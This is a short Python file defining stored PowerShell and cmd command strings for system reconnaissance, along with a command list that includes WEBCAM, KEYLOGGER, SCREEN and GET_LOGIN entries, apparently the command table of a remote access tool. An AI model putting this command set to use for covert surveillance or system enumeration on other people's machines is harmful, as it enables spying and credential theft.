# Some stored variables contasining shell or powershell commands

ps = {
    "GET_MONITORS": "Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams",
    "GET_NETSTAT": "Get-NetTCPConnection -State Listen",
    "GET_TASKS": "Get-Process",
    "GET_WINDOWS": "Get-Process | Where-Object {$_.mainWindowTitle} | Format-Table Id, Name, mainWindowtitle -AutoSize",
    "GET_USBDRIVES": "Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }",
}

cmd = {
    "GET_ROUTING": "netstat -nr",
    "GET_PROFILES": "netsh wlan show profiles"
}

direct = ["SYSINFO",
          "GET_LOCATION",
          "GET_TIME",
          "GET_DRIVES",
          "GET_CPU",
          "GET_PID",
          "GET_ENV",
          "GET_LOGIN",
          "GET_MONITORS",
          "OPEN_URL",
          "SCREEN",
          "WEBCAM",
          "KEYLOGGER",
          "FIND",
          "EXIT"
          ]

aliases = {
    "LS": "DIR",
    "OPEN_WEB": "OPEN_URL",
}
